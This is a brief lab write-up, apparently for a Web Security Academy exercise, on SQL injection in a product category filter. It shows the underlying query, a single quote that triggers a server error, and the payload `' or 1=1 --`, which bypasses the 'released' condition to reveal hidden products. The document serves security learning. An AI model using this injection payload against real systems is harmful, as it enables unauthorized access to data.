# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

1. SQLi: product category filter.
2. Goal: display one or more unreleased products.

### Analysis
- Website target: `https://0adf005804fa6d1c80c205e000ac00fa.web-security-academy.net/filter?category=Accessories`
```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1

SELECT * FROM products WHERE category =''' AND released = 1
'-- Internal Server Error.(you can use sqli attack)

SELECT * FROM products WHERE category ='' or 1=1 --' AND released = 1
-- Is always true.
```